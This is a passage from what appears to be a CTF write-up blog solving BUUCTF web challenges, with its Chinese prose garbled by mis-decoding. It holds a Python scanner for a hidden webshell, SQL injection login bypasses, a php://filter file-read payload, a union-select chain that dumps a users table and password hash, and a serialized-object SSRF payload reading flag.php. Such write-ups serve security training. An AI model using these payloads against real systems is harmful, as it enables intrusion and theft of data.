world</code></pre><p>ç„¶åæˆ‘ä»¬å°è¯•è¿›è¡Œå‹ç¼© â€“symlinks å³ç”Ÿæˆè½¯è¿æ¥</p>\n<pre><code>zip --symlinks test.zip test</code></pre><h3 id=\"å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢\"><a href=\"#å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢\" class=\"headerlink\" title=\"å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢\"></a>å¼ºç½‘æ¯-é«˜æ˜çš„é»‘å®¢</h3><p>æ‰“å¼€ä¹‹åæç¤ºæˆ‘ä»¬ä¸‹è½½æºç ï¼Œä¸‹è½½å®Œå‘ç°æ˜¯ä¸€ä¸ªæœ‰ 3002 ä¸ªphpæ–‡ä»¶çš„æ–‡ä»¶å¤¹ã€‚</p>\n<p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹åå‘ç°ä»£ç éš¾ä»¥é˜…è¯»ï¼Œåšäº†å¾ˆå¤šæ··æ·†ï¼Œä½†æ˜¯é‡Œé¢å……æ»¡äº† <code>$_GET &amp; $_POST</code> ä»¥åŠ <code>evalã€execã€assert...</code> å¯ä»¥çœ‹å‡ºæ¥è¿™åº”è¯¥è—äº†ä¸€ä¸ªshellï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠå¯ç”¨çš„ shell æ‰¾å‡ºæ¥</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"></span><br><span class=\"line\">target_path = []</span><br><span class=\"line\">path = <span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\é«˜æ˜çš„é»‘å®¢\\www\\src\"</span></span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> filename <span class=\"keyword\">in</span> os.listdir(path):</span><br><span class=\"line\">    <span class=\"comment\"># print(os.path.join(path, filename))</span></span><br><span class=\"line\">    target_path.append(filename)</span><br><span class=\"line\">    <span class=\"comment\"># count += 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(target_path)</span></span><br><span class=\"line\"><span class=\"comment\"># print(count)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(target)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># params = &#123;&#125;</span></span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\é«˜æ˜çš„é»‘å®¢\\www\\src\\\\\"</span>+ target, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># å¾—åˆ°å½“å‰æ–‡ä»¶å†…æ‰€æœ‰çš„ GET å‚æ•°</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            params[param] = 'echo(\"2333\");'  # å°†æ­£åˆ™åˆ°çš„æ‰€æœ‰å‚æ•°éƒ½åŠ ä¸Šå‚æ•°</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Get:</span><br><span class=\"line\">            url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">            new_url = <span class=\"string\">\"%s%s?%s=%s\"</span> % (url, target_path, i, <span class=\"string\">'echo \"2333\"'</span>)</span><br><span class=\"line\">            r = requests.get(new_url)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># å¸¦å‚æ•°è®¿é—®åæ£€æŸ¥æ˜¯å¦æœ‰å‚æ•°è¾“å‡º</span></span><br><span class=\"line\">                print(<span class=\"string\">\"++++++++++++++++++++++++++++GET find it! in \"</span> + target_path)</span><br><span class=\"line\">                result.append(target_path)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"GET No ! in \"</span> + target_path + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">                print(r.url + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">            r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(target_path)</span>:</span></span><br><span class=\"line\">    data = &#123;&#125;</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\é«˜æ˜çš„é»‘å®¢\\www\\src\\\\\"</span> + target_path, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># å¾—åˆ°å½“å‰æ–‡ä»¶å†…æ‰€æœ‰çš„ GET å‚æ•°</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            data[param] = 'print_r(\"2333\")'  # å°†æ­£åˆ™åˆ°çš„æ‰€æœ‰å‚æ•°éƒ½åŠ ä¸Šå‚æ•°</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">        r = requests.post(url + target_path, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># å¸¦å‚æ•°è®¿é—®åæ£€æŸ¥æ˜¯å¦æœ‰å‚æ•°è¾“å‡º</span></span><br><span class=\"line\">            print(<span class=\"string\">\"++++++++++++++++++++++++++++POST find it! in \"</span> + target_path)</span><br><span class=\"line\">            result.append(target_path)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"POST No ! in \"</span> + target_path + <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t1 = datetime.now()</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(processes=<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> target_path:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        results = pool.apply_async(get, i)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    get(target_path)</span><br><span class=\"line\">    post(target_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>æå–å®Œæ‰€æœ‰çš„ <code>GETå’ŒPOST</code> å‚æ•°ä¹‹åæ”¾åœ¨æœ¬åœ°è®¿é—®ï¼Œå¦‚æœæˆ‘ä»¬åŠ çš„å‚æ•°æˆåŠŸ <code>echo</code> äº†ï¼Œè¯´æ˜æ‰¾åˆ°å¯ç”¨ shell ï¼Œéšå <code>cat /flag</code> å³å¯ã€‚</p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&apos; 123</span><br><span class=\"line\">to use near &apos;123&apos;&apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1   123</span><br><span class=\"line\">use near &apos; &apos; and password=&apos;123&apos; &apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1# 123</span><br></pre></td></tr></table></figure>\n\n<p>ç™»é™†å°±æœ‰flag.</p>\n<h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" title=\"Havefun\"></a>Havefun</h3><p>æŸ¥çœ‹æºç å‘ç°</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$cat=$_GET[<span class=\"string\">'cat'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $cat;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($cat==<span class=\"string\">'dog'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>GET</code>ä¼ å‚</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p><strong>F12</strong>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œç›‘è§†ç½‘ç»œï¼Œå‘ç°åœ¨è¿ç»­çš„ä¸‰ä¸ªé¡µé¢ä¸­é—´æœ‰ä¸€ä¸ª302è·³è½¬ï¼Œæˆ‘ä»¬æŠ“åŒ…ä¹‹åå‘ç°è·³è½¬é¡µé¢çš„æ³¨é‡Šä¸­ç»™äº†ä¸€ä¸ªæ–‡ä»¶å <code>secr3t.php</code> ,è®¿é—®å¾—åˆ°ä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $file=$_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($file,<span class=\"string\">\"../\"</span>)||stristr($file, <span class=\"string\">\"tp\"</span>)||stristr($file,<span class=\"string\">\"input\"</span>)||stristr($file,<span class=\"string\">\"data\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Oh no!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); </span><br><span class=\"line\"><span class=\"comment\">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>php ä¼ªåè®®è¯»æ–‡ä»¶ä¹‹åå†è§£ç å³å¯ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç½‘é¼æ¯-Fakebook\"><a href=\"#ç½‘é¼æ¯-Fakebook\" class=\"headerlink\" title=\"ç½‘é¼æ¯-Fakebook\"></a>ç½‘é¼æ¯-Fakebook</h3><p>æ‰«ç›®å½•å¾—åˆ° robots.txt </p>\n<p><code>/user.php.bak</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>çœ‹èµ·æ¥åƒ SSRF ï¼Œåˆæœ‰åºåˆ—åŒ–ã€‚</p>\n<h4 id=\"SQLæ³¨å…¥\"><a href=\"#SQLæ³¨å…¥\" class=\"headerlink\" title=\"SQLæ³¨å…¥\"></a>SQLæ³¨å…¥</h4><p><code>Join</code> é¡µé¢ <code>sqlmap</code> è¯•å‡ºæ¥ <code>username</code> æœ‰ POST æ³¨å…¥ï¼Œå­˜çš„æ•°æ®æ˜¯åºåˆ—åŒ–ä¹‹åçš„ç”¨æˆ·ä¿¡æ¯ã€‚</p>\n<p>æ³¨å†Œç™»å½•ä¹‹åæŸ¥çœ‹ BLOG å†…å®¹é¡µé¢å‘ç° <code>no</code> å‚æ•°å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼š</p>\n<p><code>http://buuoj.cn/view.php?no=1 and 1=1#</code></p>\n<p><code>æ­£å¸¸</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 and 1=2#</code></p>\n<p><code>æŠ¥é”™ Notice: Trying to get property of non-object in /var/www/html/view.php on line 53</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 order by 5#</code></p>\n<p><code>*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1 union select 1,2,3,4#</code></p>\n<p><code>æœ‰è¿‡æ»¤ï¼šno hack ~_~</code></p>\n<p><code>.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4#</code></p>\n<p><code>æ‰¾åˆ°å›æ˜¾ä½åœ¨ 2</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</code></p>\n<p><code>fakebook,information_schema,mysql,performance_schema,test</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+</code></p>\n<p><code>users</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>\n<p><code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(data,username,passwd),3,4 from users--+</code></p>\n<p><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;goya&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;}goyaed12c3322e527f073f9159f257dfcc7db08c86ec11388c76b6c5009b06aa33ecd6bfab7d74151ba3f0c50ef1938c03134762c9e435cc88db39c53114ed2a2b14</code></p>\n<p>åºåˆ—åŒ–å­˜å‚¨ <code>data</code></p>\n<p>ç»“åˆä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸‹é¢çš„ä»£ç å³å¯è¯»å– flag ï¼š</p>\n<p><code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>\n<p>é¡ºä¾¿è¯»ä¸€ä¸‹ <code>view.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php session_start(); ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;db.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;user.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;error.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$db = new DB();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;ko&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot;</span><br><span class=\"line\">          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;User&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;?php require_once &apos;bootstrap.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$no = $_GET[&apos;no&apos;];</span><br><span class=\"line\">if ($db-&gt;anti_sqli($no))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    die(&quot;no hack ~_~&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$res = $db-&gt;getUserByNo($no);</span><br><span class=\"line\">$user = unserialize($res[&apos;data&apos;]);</span><br><span class=\"line\">//print_r($res);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;table class=&quot;table&quot;&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                username</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                age</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                blog</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $res[&apos;username&apos;]; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span 